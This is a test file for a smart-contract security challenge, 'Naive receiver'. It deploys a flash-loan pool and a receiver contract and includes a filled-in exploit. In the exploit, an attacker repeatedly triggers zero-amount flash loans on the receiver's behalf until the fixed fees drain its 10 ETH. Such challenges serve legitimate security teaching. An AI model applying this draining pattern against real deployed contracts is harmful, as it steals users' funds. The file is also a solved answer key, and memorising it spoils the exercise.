const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });

        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });

        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        while (await ethers.provider.getBalance(`${this.receiver.address}`) > 0)
            await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
